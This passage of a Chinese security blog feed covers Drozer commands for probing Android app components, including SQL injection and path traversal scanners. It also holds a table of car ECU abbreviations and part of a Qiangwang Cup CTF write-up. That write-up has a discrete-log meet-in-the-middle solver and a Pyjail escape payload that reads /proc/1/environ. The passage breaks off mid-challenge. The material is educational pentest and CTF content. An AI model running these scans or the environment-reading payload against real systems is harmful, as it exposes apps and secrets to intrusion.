align="center">暴露的Service对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Service接收可能产生安全隐患</td></tr><tr><td align="center">拒绝服务</td><td align="center">Service的拒绝服务主要来源于Service启动时对接收的Intent等没有做异常情况下的处理，导致程序崩溃</td></tr></tbody></table><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><h4 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h4><h5 id="Activity-1"><a href="#Activity-1" class="headerlink" title="Activity"></a>Activity</h5><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">app.activity.forintent <span class="hljs-comment"># 找到可以处理已指定的包</span><br>app.activity.<span class="hljs-literal">inf</span>o <span class="hljs-comment"># 获取activity组件信息</span><br>app.activity.<span class="hljs-literal">start</span> <span class="hljs-comment"># 开启activity组件</span><br>scanner.activity.browsable <span class="hljs-comment"># 获取可从web浏览器调用的所有可浏览的activity组件</span><br></code></pre></td></tr></table></figure><h5 id="Service-1"><a href="#Service-1" class="headerlink" title="Service"></a>Service</h5><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">app.service.info <span class="hljs-comment"># 获取service组件信息</span><br>app.service.<span class="hljs-built_in">send</span> <span class="hljs-comment"># 向服务组件发送消息并显示答复</span><br>app.service.<span class="hljs-built_in">start</span> <span class="hljs-comment"># 开启service组件</span><br>app.service.<span class="hljs-built_in">stop</span> <span class="hljs-comment"># 停止service组件</span><br></code></pre></td></tr></table></figure><h5 id="Content-Provider"><a href="#Content-Provider" class="headerlink" title="Content Provider"></a>Content Provider</h5><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">app.provider.columns <span class="hljs-comment"># 在内容提供程序中列出列</span><br>app.provider.delete <span class="hljs-comment"># 在内容提供程序中删除</span><br>app.provider.download <span class="hljs-comment"># 在内容提供程序中下载支持文件</span><br>app.provider.finduri <span class="hljs-comment"># 在包中查找引用的内容URIS</span><br>app.provider.info <span class="hljs-comment"># 获取Content Provider组件信息</span><br>app.provider.<span class="hljs-keyword">insert </span><span class="hljs-comment"># 插入到Content Provider组件中</span><br>app.provider.query <span class="hljs-comment"># 查询Content Provider组件</span><br>app.provider.read <span class="hljs-comment"># 从支持文件的Content Provider读取</span><br>app.provider.update <span class="hljs-comment"># 更新Content Provider的记录</span><br><span class="hljs-keyword">scanner.provider.finduris </span><span class="hljs-comment"># 搜索可从上下文中查询的Content Provider</span><br><span class="hljs-keyword">scanner.provider.injection </span><span class="hljs-comment"># 测试Content Provider的注入漏洞</span><br><span class="hljs-keyword">scanner.provider.sqltables </span><span class="hljs-comment"># 查找可通过SQL注入漏洞访问的表</span><br><span class="hljs-keyword">scanner.provider.traversal </span><span class="hljs-comment"># 测试Content Provider的基本目录遍历漏洞</span><br></code></pre></td></tr></table></figure><h5 id="Broadcast-Receivers"><a href="#Broadcast-Receivers" class="headerlink" title="Broadcast Receivers"></a>Broadcast Receivers</h5><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">app.<span class="hljs-keyword">broadcast.info </span><span class="hljs-comment"># 获取有关广播接收器的信息</span><br>app.<span class="hljs-keyword">broadcast.send </span><span class="hljs-comment"># 带目的发送广播</span><br>app.<span class="hljs-keyword">broadcast.sniff </span><span class="hljs-comment"># 注册一个能嗅出特定意图的广播接收器</span><br></code></pre></td></tr></table></figure><h5 id="获取APP包信息"><a href="#获取APP包信息" class="headerlink" title="获取APP包信息"></a>获取APP包信息</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">app<span class="hljs-selector-class">.package</span><span class="hljs-selector-class">.attacksurface</span> #获取包攻击面<br>app<span class="hljs-selector-class">.package</span><span class="hljs-selector-class">.backup</span> #列出使用备份API的包(在标记“允许备份”时返回true)<br>app<span class="hljs-selector-class">.package</span><span class="hljs-selector-class">.debuggable</span> #查找可调试包<br>app<span class="hljs-selector-class">.package</span><span class="hljs-selector-class">.info</span> #获取有关已安装软件包的信息<br>app<span class="hljs-selector-class">.package</span><span class="hljs-selector-class">.launchintent</span> #获取包的启动意图<br>app<span class="hljs-selector-class">.package</span><span class="hljs-selector-class">.list</span> #列出程序包<br>app<span class="hljs-selector-class">.package</span><span class="hljs-selector-class">.manifest</span> #获取包的AndroidManifest<span class="hljs-selector-class">.xml</span><br>app<span class="hljs-selector-class">.package</span><span class="hljs-selector-class">.native</span> #查找嵌入在应用程序中的本地库<br>app<span class="hljs-selector-class">.package</span><span class="hljs-selector-class">.shareduid</span> #查找具有共享uid的包<br></code></pre></td></tr></table></figure><h4 id="一些命令"><a href="#一些命令" class="headerlink" title="一些命令"></a>一些命令</h4><p><strong>通过app.package.list模块获取要检测的app的包名</strong><br><code>dz&gt; run app.package.list -f filter_str</code><br><strong>查看指定 apk 信息（版本，数据库存储目录，权限信息等）</strong><br><code>dz&gt; run app.package.info -a &lt;package_name&gt;</code><br><strong>使用app.package.attacksurface模块识别攻击面</strong><br><code>dz&gt; run app.package.attacksurface &lt;package_name&gt;</code><br><strong>使用app.activity.info模块查看activity组件信息</strong><br><code>dz&gt; run app.activity.info -a &lt;package_name&gt;</code><br><strong>使用app.provider.info模块查看content provider组件信息</strong><br><code>dz&gt; run app.provider.info -a &lt;package_name&gt;</code><br><strong>使用app.service.info模块查看service组件信息</strong><br><code>dz&gt; run app.service.info -a &lt;package_name&gt;</code><br><strong>使用scanner.provider.injection 扫描是否有 sql 注入</strong><br><code>dz&gt; run scanner.provider.injection -a &lt;package_name&gt;</code><br><strong>使用scanner.provider.finduris扫描访问 content provider 的URI（数据泄露）</strong><br><code>dz&gt; run scanner.provider.finduris -a &lt;package_name&gt;</code><br><strong>获取指定应用的导出组件</strong><br><code>dz&gt; run app.activity.info -a &lt;package_name&gt;</code><br><code>dz&gt; run app.service.info -a &lt;package_name&gt;</code><br><code>dz&gt; run app.broadcast.info -a &lt;package_name&gt;</code><br><code>dz&gt; run scanner.provider.finduris -a &lt;package_name&gt;</code></p>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoV</tag>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ECU</title>
    <link href="/2024/01/18/ECU/"/>
    <url>/2024/01/18/ECU/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E6%8E%A7%E5%88%B6%E5%99%A8">ECU</a>（Electronic Control Unit）是<a href="https://zh.wikipedia.org/wiki/%E6%B1%BD%E8%BB%8A%E9%9B%BB%E5%AD%90">汽车电子</a>系统中用来控制电气系统、电子系统及汽车子系统的<a href="https://zh.wikipedia.org/wiki/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F">嵌入式系统</a>。无论是看车辆架构图还是UDS诊断报文分析都离不开ECU，现如今电车高度智能化，ECU也多的让人眼花缭乱，吐血整理ECU缩写及其对应的释义，方便后期分析学习。</p><table><thead><tr><th align="center"><strong>缩写</strong></th><th align="center"><strong>英文</strong></th><th align="center"><strong>中文</strong></th></tr></thead><tbody><tr><td align="center"><strong>ACCM</strong></td><td align="center">Air compressor Control Module</td><td align="center">空调压缩机模块</td></tr><tr><td align="center"><strong>ACM</strong></td><td align="center">Alternator Control Module</td><td align="center">交流电机控制模块</td></tr><tr><td align="center"><strong>AFU</strong></td><td align="center">Air Fragance Unit</td><td align="center">空气芬香模块</td></tr><tr><td align="center"><strong>AGM</strong></td><td align="center">Active Grill Shutter Module</td><td align="center">主动格栅关闭模块</td></tr><tr><td align="center"><strong>AIU</strong></td><td align="center">Air Ionizer Unit</td><td align="center">空气负离子发生器</td></tr><tr><td align="center"><strong>ALM</strong></td><td align="center">Ambience Lights Module</td><td align="center">氛围灯</td></tr><tr><td align="center"><strong>APMS</strong></td><td align="center">Air Particulate Matter Sensor</td><td align="center">PM2.5</td></tr><tr><td align="center"><strong>ASDM</strong></td><td align="center">Active Safety Domain Master</td><td align="center">主动安全域控制器</td></tr><tr><td align="center"><strong>ASSM</strong></td><td align="center">Active Spoiler Shutter Module</td><td align="center">主动扰流模块</td></tr><tr><td align="center"><strong>ASWM</strong></td><td align="center">Adjustable Steering Wheel Module</td><td align="center">可调方向盘模块</td></tr><tr><td align="center"><strong>AUD</strong></td><td align="center">Audio Module</td><td align="center">音响模块</td></tr><tr><td align="center"><strong>BBM</strong></td><td align="center">Brake Booster Module</td><td align="center">制动助力器模块</td></tr><tr><td align="center"><strong>BBS</strong></td><td align="center">Battery Backed-up Sounder</td><td align="center">后备电池报警器</td></tr><tr><td align="center"><strong>BECM</strong></td><td align="center">Battery Energy Control Module</td><td align="center">电池管理系统</td></tr><tr><td align="center"><strong>BMS</strong></td><td align="center">Battery Monitoring Sensor</td><td align="center">蓄电池监测传感器</td></tr><tr><td align="center"><strong>CCM</strong></td><td align="center">Climate Control Module</td><td align="center">空调控制模块</td></tr><tr><td align="center"><strong>CCSM</strong></td><td align="center">Center Console Switch Module</td><td align="center">中控开关模块</td></tr><tr><td align="center"><strong>CEM</strong></td><td align="center">Central Electronic Module</td><td align="center">中央电控模块（车身控制模块）</td></tr><tr><td align="center"><strong>CFCM</strong></td><td align="center">Charger Flap Control Module</td><td align="center">充电口盖</td></tr><tr><td align="center"><strong>CMS</strong></td><td align="center">Camera Monitoring System</td><td align="center">流媒体监视系统</td></tr><tr><td align="center"><strong>CSD</strong></td><td align="center">Center Stack Display</td><td align="center">中控台显示屏</td></tr><tr><td align="center"><strong>CSDM</strong></td><td align="center">Console Switch Display Module</td><td align="center">中控触摸显示屏（副屏）</td></tr><tr><td align="center"><strong>DDM</strong></td><td align="center">Driver Door Module</td><td align="center">驾驶员车门模块</td></tr><tr><td align="center"><strong>DDS</strong></td><td align="center">Driver Door Switches</td><td align="center">驾驶员侧车门组合开关</td></tr><tr><td align="center"><strong>DEM</strong></td><td align="center">Differential Electronic Module</td><td align="center">电子差速器模块</td></tr><tr><td align="center"><strong>DIG</strong></td><td align="center">Driver intelligent change colour glass module</td><td align="center">驾驶侧智能变色玻璃模块</td></tr><tr><td align="center"><strong>DIM</strong></td><td align="center">Driver Information Module</td><td align="center">驾驶员信息模块</td></tr><tr><td align="center"><strong>DMM</strong></td><td align="center">Driver Monitor Module</td><td align="center">驾驶员状态监测模块</td></tr><tr><td align="center"><strong>DMSM</strong></td><td align="center">Drive Mode Switch Module</td><td align="center">驾驶模式开关模块</td></tr><tr><td align="center"><strong>DPOD</strong></td><td align="center">Driver Power Operated Door</td><td align="center">驾驶侧电动门控制模块</td></tr><tr><td align="center"><strong>DRM</strong></td><td align="center">Driver Radar module</td><td align="center">驾驶侧雷达模块</td></tr><tr><td align="center"><strong>DSRC</strong></td><td align="center">Dedicated Short Range Communication</td><td align="center">近程通讯模块</td></tr><tr><td align="center"><strong>DVR</strong></td><td align="center">Digital Video Record</td><td align="center">行车记录仪</td></tr><tr><td align="center"><strong>EAV</strong></td><td align="center">Electric exhaust Acoustic Valve</td><td align="center">排气电动调音阀</td></tr><tr><td align="center"><strong>ECM</strong></td><td align="center">Engine Control Module</td><td align="center">发动机控制模块</td></tr><tr><td align="center"><strong>ECPM</strong></td><td align="center">Engine Coolant Pump Module</td><td align="center">发动机冷却泵模块</td></tr><tr><td align="center"><strong>ECS</strong></td><td align="center">Electic Clutch System</td><td align="center">电子离合器</td></tr><tr><td align="center"><strong>EDCP</strong></td><td align="center">Electric Drivetrain Coolant Pump</td><td align="center">电控动力传动系统冷却泵</td></tr><tr><td align="center"><strong>EGSM</strong></td><td align="center">Electronic Gear Selector Module</td><td align="center">电子换档模块</td></tr><tr><td align="center"><strong>ESM</strong></td><td align="center">Exterior Sound Module</td><td align="center">外部发声模块</td></tr><tr><td align="center"><strong>FCSI</strong></td><td align="center">Fast Charger Socket Indicator</td><td align="center">快充指示</td></tr><tr><td align="center"><strong>FLC</strong></td><td align="center">Forward Looking Camera</td><td align="center">前视摄像头</td></tr><tr><td align="center"><strong>FLR</strong></td><td align="center">Forward Looking Radar</td><td align="center">前视雷达</td></tr><tr><td align="center"><strong>FMDM</strong></td><td align="center">Foot Movement Detection Module</td><td align="center">脚下移动侦测模块</td></tr><tr><td align="center"><strong>FPM</strong></td><td align="center">Finger Print Module</td><td align="center">指纹识别模块</td></tr><tr><td align="center"><strong>FSRL</strong></td><td align="center">Front Side Radar Left</td><td align="center">前左侧方雷达</td></tr><tr><td align="center"><strong>FSRR</strong></td><td align="center">Front Side Radar Right</td><td align="center">前右侧方雷达</td></tr><tr><td align="center"><strong>HBMF</strong></td><td align="center">HVAC Blower Module Front</td><td align="center">前空调鼓风机模块</td></tr><tr><td align="center"><strong>HCML</strong></td><td align="center">Head Lamp Control Module Left</td><td align="center">左前大灯控制模块</td></tr><tr><td align="center"><strong>HCMR</strong></td><td align="center">Head Lamp Control Module Right</td><td align="center">右前大灯控制模块</td></tr><tr><td align="center"><strong>HFAF</strong></td><td align="center">HVAC Flap Actuators Front</td><td align="center">风门电机</td></tr><tr><td align="center"><strong>HUD</strong></td><td align="center">Head Up Display</td><td align="center">抬头显示</td></tr><tr><td align="center"><strong>HVCH</strong></td><td align="center">High Voltage Coolant Heater</td><td align="center">高压冷却液加热器</td></tr><tr><td align="center"><strong>IEM</strong></td><td align="center">Inverter ERAD Module</td><td align="center">逆变式电动后桥驱动模块</td></tr><tr><td align="center"><strong>IGM</strong></td><td align="center">Inverter Generator Module</td><td align="center">变频发电机模块</td></tr><tr><td align="center"><strong>IHU</strong></td><td align="center">Infotainment Head Unit</td><td align="center">信息娱乐主机（音响主机）</td></tr><tr><td align="center"><strong>IMS</strong></td><td align="center">Interior Movement Sensor</td><td align="center">内部运动传感器</td></tr><tr><td align="center"><strong>IRMM</strong></td><td align="center">Interior Rear view Mirror Module</td><td align="center">内后视镜模块</td></tr><tr><td align="center"><strong>ISGM</strong></td><td align="center">Integrated start generator module</td><td align="center">智能发电机模块</td></tr><tr><td align="center"><strong>LPOD</strong></td><td align="center">left Rear Operated Door</td><td align="center">左后电动门控制模块</td></tr><tr><td align="center"><strong>MMD</strong></td><td align="center">Driver Massage Module</td><td align="center">驾驶侧按摩模块</td></tr><tr><td align="center"><strong>MML</strong></td><td align="center">Massage Module Left</td><td align="center">左后乘客侧按摩模块</td></tr><tr><td align="center"><strong>MMP</strong></td><td align="center">Passenger Massage Module</td><td align="center">副驾驶侧按摩模块</td></tr><tr><td align="center"><strong>MMR</strong></td><td align="center">Massage Module Right</td><td align="center">右后乘客侧按摩模块</td></tr><tr><td align="center"><strong>MVBM</strong></td><td align="center">Medium Voltage Battery Module</td><td align="center">中压电池管理</td></tr><tr><td align="center"><strong>MVCM</strong></td><td align="center">Middle voltage control module</td><td align="center">中压控制模块</td></tr><tr><td align="center"><strong>NVM</strong></td><td align="center">Night Vision Module</td><td align="center">夜视模块</td></tr><tr><td align="center"><strong>OBC</strong></td><td align="center">On Board Charger</td><td align="center">充电口（车载充电器)</td></tr><tr><td align="center"><strong>OHC</strong></td><td align="center">Overhead Console</td><td align="center">顶灯模块（带天窗控制开关）</td></tr><tr><td align="center"><strong>OWS</strong></td><td align="center">Occupant Weight Sensor</td><td align="center">成员检测传感器（座椅内部，用来检测是否坐人的传感器）</td></tr><tr><td align="center"><strong>PAC</strong></td><td align="center">Park Assist Camera</td><td align="center">驻车辅助摄像头</td></tr><tr><td align="center"><strong>PAS</strong></td><td align="center">Parking Assist System</td><td align="center">驻车辅助系统</td></tr><tr><td align="center"><strong>PDM</strong></td><td align="center">Passenger Door Module</td><td align="center">副驾驶门模块</td></tr><tr><td align="center"><strong>PIG</strong></td><td align="center">Passenger intelligent change colour glass module</td><td align="center">副驾驶侧智能变色玻璃模块</td></tr><tr><td align="center"><strong>POT</strong></td><td align="center">Power Operated Tailgate</td><td align="center">电动后背门</td></tr><tr><td align="center"><strong>PPOD</strong></td><td align="center">Passenger Power Operated Door</td><td align="center">乘客侧电动门控制模块</td></tr><tr><td align="center"><strong>PRM</strong></td><td align="center">Passenger Radar module</td><td align="center">副驾驶侧雷达模块</td></tr><tr><td align="center"><strong>PSCM</strong></td><td align="center">Power Steering Control Module</td><td align="center">电动助力转向模块</td></tr><tr><td align="center"><strong>RCML</strong></td><td align="center">Rear Lamp Control Module Left</td><td align="center">左尾灯控制模块</td></tr><tr><td align="center"><strong>RCMR</strong></td><td align="center">Rear Lamp Control Module Right</td><td align="center">右尾灯控制模块</td></tr><tr><td align="center"><strong>RCSM</strong></td><td align="center">Rear Console Switch Module</td><td align="center">后开关控制模块</td></tr><tr><td align="center"><strong>RDDM</strong></td><td align="center">Rear Driver Door Module</td><td align="center">后驾驶侧门模块</td></tr><tr><td align="center"><strong>RDIG</strong></td><td align="center">Rear Driver intelligent change colour glass module</td><td align="center">左后乘客侧智能变色玻璃模块</td></tr><tr><td align="center"><strong>RDRM</strong></td><td align="center">Rear Driver Radar module</td><td align="center">驾驶侧后雷达模块</td></tr><tr><td align="center"><strong>RLSM</strong></td><td align="center">Rain and Light Sensor Module</td><td align="center">阳光雨量传感器</td></tr><tr><td align="center"><strong>RMD</strong></td><td align="center">Rear View Mirror Display</td><td align="center">内后视镜显示</td></tr><tr><td align="center"><strong>RML</strong></td><td align="center">Restraint Module Left</td><td align="center">左约束模块（气囊安全带控制模块）</td></tr><tr><td align="center"><strong>RMR</strong></td><td align="center">Restraint Module Right</td><td align="center">右约束模块（气囊安全带控制模块）</td></tr><tr><td align="center"><strong>RPDM</strong></td><td align="center">Rear Passenger Door Module</td><td align="center">后排乘客门模块</td></tr><tr><td align="center"><strong>RPIG</strong></td><td align="center">Rear Passenger intelligent change colour glass module</td><td align="center">右后乘客侧智能变色玻璃模块</td></tr><tr><td align="center"><strong>RPOD</strong></td><td align="center">Right Rear Operated Door</td><td align="center">右后电动门控制模块</td></tr><tr><td align="center"><strong>RPRM</strong></td><td align="center">Rear Passenger Radar module</td><td align="center">副驾驶侧后雷达模块</td></tr><tr><td align="center"><strong>SAS</strong></td><td align="center">Steering Angle Sensor</td><td align="center">转向角传感器</td></tr><tr><td align="center"><strong>SCL</strong></td><td align="center">Steering Column Lock</td><td align="center">转向柱锁</td></tr><tr><td align="center"><strong>SCM</strong></td><td align="center">Sun Curtain Module</td><td align="center">遮阳帘模块</td></tr><tr><td align="center"><strong>SCSI</strong></td><td align="center">Slow Charger Socket Indicator</td><td align="center">慢充指示</td></tr><tr><td align="center"><strong>SGT</strong></td><td align="center">Skylight glass top</td><td align="center">天窗玻璃星空顶</td></tr><tr><td align="center"><strong>SHD</strong></td><td align="center">Driver Seat Heating</td><td align="center">座椅通风</td></tr><tr><td align="center"><strong>SHR</strong></td><td align="center">Seat Heat Rear Module</td><td align="center">后座椅加热模块</td></tr><tr><td align="center"><strong>SIG</strong></td><td align="center">Sunroof intelligent change colour glass module</td><td align="center">智能天窗玻璃变色模块</td></tr><tr><td align="center"><strong>SMD</strong></td><td align="center">Driver Seat Module</td><td align="center">驾驶侧座椅模块</td></tr><tr><td align="center"><strong>SMP</strong></td><td align="center">Passenger Seat Module</td><td align="center">乘客侧座椅模块</td></tr><tr><td align="center"><strong>SMR</strong></td><td align="center">Seat Module Rear</td><td align="center">后座椅模块</td></tr><tr><td align="center"><strong>SODL</strong></td><td align="center">Side Obstacle Detection Left</td><td align="center">左侧障碍侦测</td></tr><tr><td align="center"><strong>SODR</strong></td><td align="center">Side Obstacle Detection Right</td><td align="center">右侧障碍侦测</td></tr><tr><td align="center"><strong>SRM</strong></td><td align="center">Sun Roof Module</td><td align="center">天窗模块</td></tr><tr><td align="center"><strong>SRS</strong></td><td align="center">Supplementary Restraint System</td><td align="center">约束系统—安全气囊</td></tr><tr><td align="center"><strong>SUM</strong></td><td align="center">Suspension Module</td><td align="center">悬架模块</td></tr><tr><td align="center"><strong>SWM</strong></td><td align="center">Steering Wheel Module</td><td align="center">组合开关模块</td></tr><tr><td align="center"><strong>SWSM</strong></td><td align="center">Steering Wheel Switch Module</td><td align="center">转向盘开关模块</td></tr><tr><td align="center"><strong>TACM</strong></td><td align="center">Transmission Actuator Control Module</td><td align="center">变速箱执行器控制模块</td></tr><tr><td align="center"><strong>TCAM</strong></td><td align="center">Telematics &amp; Connectivity Antenna Module</td><td align="center">车载信息系统连接天线模块</td></tr><tr><td align="center"><strong>TCH</strong></td><td align="center">Thermal Cup Holder</td><td align="center">冷热杯托</td></tr><tr><td align="center"><strong>TCM</strong></td><td align="center">Transmission Control Module</td><td align="center">变速器控制模块</td></tr><tr><td align="center"><strong>TPM</strong></td><td align="center">Touch Panel Module</td><td align="center">触控手写板</td></tr><tr><td align="center"><strong>TRM</strong></td><td align="center">Trailer Module</td><td align="center">拖车模块</td></tr><tr><td align="center"><strong>VBMR</strong></td><td align="center">VAC Blower Module Rear</td><td align="center">后空调鼓风机模块</td></tr><tr><td align="center"><strong>VDDM</strong></td><td align="center">Vehicle Dynamics Domain Master</td><td align="center">动力域主节点（FLEXRAY的主干网的节点，也有ESP功能）</td></tr><tr><td align="center"><strong>VGM</strong></td><td align="center">Vehicle Gateway Module</td><td align="center">车辆网关模块</td></tr><tr><td align="center"><strong>VMPS</strong></td><td align="center">Vehicle Motion Position system</td><td align="center">车辆移动定位系统</td></tr><tr><td align="center"><strong>VRM</strong></td><td align="center">Vehicle Refrigerator Module</td><td align="center">车载冰箱</td></tr><tr><td align="center"><strong>WMM</strong></td><td align="center">Wiper Motor Module</td><td align="center">电动雨刮</td></tr><tr><td align="center"><strong>WPC</strong></td><td align="center">Wireless Power Charge</td><td align="center">手机无线充电</td></tr><tr><td align="center"><strong>NFC</strong></td><td align="center">Near Field Communication</td><td align="center">近场通信</td></tr><tr><td align="center"><strong>WPT</strong></td><td align="center">Wireless Power Transfer</td><td align="center">无线充电模块</td></tr><tr><td align="center"><strong>VGA</strong></td><td align="center">Vent Grill Actuator</td><td align="center">空调出风口</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>IoV</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoV</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯S7</title>
    <link href="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023/"/>
    <url>/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023/</url>
    
    <content type="html"><![CDATA[<p>我他妈怎么这么菜啊！我他妈怎么这么菜啊！我他妈怎么这么菜啊！</p><p><img src="https://p.sda1.dev/14/aaaa6e10bdcb2dd1b69a51fb708b0749/37E4CF6E2C3F9A4F10F1BFF6985BCFAC.gif"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="discrete-log"><a href="#discrete-log" class="headerlink" title="discrete_log"></a>discrete_log</h3><p>DLP问题，p=2q+1,一开始看这个p作为安全素数，怎么能分解，然后查到了几个帖子。</p><p><a href="https://crypto.stackexchange.com/q/2990/109345">How can I solve the discrete logarithm modulo 2q+1 if I can solve it in the subgroup of order q?</a></p><p><a href="https://crypto.stackexchange.com/q/46826/109345">On getting beyond LSB in discrete log</a></p><p>第一个告诉我们安全素数可以从Zp群降到Zq群，其实就是方便分解也没啥特别了。第二个贴说了一个 $r^{x}=hg^{-x_0}\bmod p$ 的办法，结合给出的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = <span class="hljs-string">&#x27;flag&#123;d3b07b0d416ebb&#125;&#x27;</span><br><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag) &lt;= <span class="hljs-number">45</span><br><span class="hljs-keyword">assert</span> flag.startswith(<span class="hljs-string">&#x27;flag&#123;&#x27;</span>)<br><span class="hljs-keyword">assert</span> flag.endswith(<span class="hljs-string">&#x27;&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>可以知道去掉flag头和flag尾，还有pad，字符串应该不大，选择大概在10~20左右进行爆破，就是中间人相遇的问题了，硬爆。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python">p = <br>g = <span class="hljs-number">5</span><br>c = <br><br>q = (p - <span class="hljs-number">1</span>) // <span class="hljs-number">2</span><br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product<br><br>i = <span class="hljs-number">12</span> <span class="hljs-comment"># 调一次10多分钟，不会多线程真麻了</span><br><br>tmpf = bytes_to_long(pad(<span class="hljs-string">b&#x27;flag&#123;&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> * i + <span class="hljs-string">b&#x27;&#125;&#x27;</span>, <span class="hljs-number">128</span>))<br>lift = <span class="hljs-built_in">pow</span>(<span class="hljs-number">256</span>, (<span class="hljs-number">128</span> - i - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;flag&#123;&#125;&#x27;</span>) + <span class="hljs-number">1</span>))<br>c= c* <span class="hljs-built_in">pow</span>(g, -tmpf, p) % p<br>c= <span class="hljs-built_in">pow</span>(c, inverse(lift, q), p)<br><br>table = [<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]<br>dic = <span class="hljs-built_in">dict</span>()<br>hg, lg = <span class="hljs-built_in">pow</span>(g, <span class="hljs-number">256</span>**(i//<span class="hljs-number">2</span>), p), g<br><br><span class="hljs-keyword">for</span> pre <span class="hljs-keyword">in</span> tqdm(product(table, repeat=i//<span class="hljs-number">2</span>)):<br>    pre = bytes_to_long(<span class="hljs-string">&#x27;&#x27;</span>.join(pre).encode())<br>    now = c* <span class="hljs-built_in">pow</span>(hg, -pre, p) % p<br>    dic[now] = pre<br><br><span class="hljs-keyword">for</span> suf <span class="hljs-keyword">in</span> tqdm(product(table, repeat=i//<span class="hljs-number">2</span>)):<br>    suf = bytes_to_long(<span class="hljs-string">&#x27;&#x27;</span>.join(suf).encode())<br>    now = <span class="hljs-built_in">pow</span>(lg, suf, p)<br>    <span class="hljs-keyword">if</span> now <span class="hljs-keyword">in</span> dic:<br>        <span class="hljs-built_in">print</span>(dic[now])<br>        <span class="hljs-built_in">print</span>(suf)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;flag&#123;&#x27;</span> + long_to_bytes(dic[now]) + long_to_bytes(suf) + <span class="hljs-string">b&#x27;&#125;&#x27;</span>)<br>        <br><span class="hljs-comment">#b&#x27;flag&#123;61e8007dd65f&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Pyjail-It’s-myFILTER"><a href="#Pyjail-It’s-myFILTER" class="headerlink" title="Pyjail ! It’s myFILTER !!!"></a>Pyjail ! It’s myFILTER !!!</h3><p>又又又非预期嘞，参考今年CISCN初赛的可信度量，直接读取环境变量，使用Python的<code>open().read()</code>来读取<code>/proc/1/environ</code>文件的内容<br><code>&#123;print(open(&quot;/proc/1/environ&quot;).read())&#125;</code></p><h3 id="Happy-Chess"><a href="#Happy-Chess" class="headerlink" title="Happy Chess"></a>Happy Chess</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Welcome <span class="hljs-built_in">to</span> Happy Chess!<br>The rule is <span class="hljs-built_in">to</span> select <span class="hljs-keyword">a</span> piece <span class="hljs-keyword">and</span> flip all <span class="hljs-keyword">the</span> 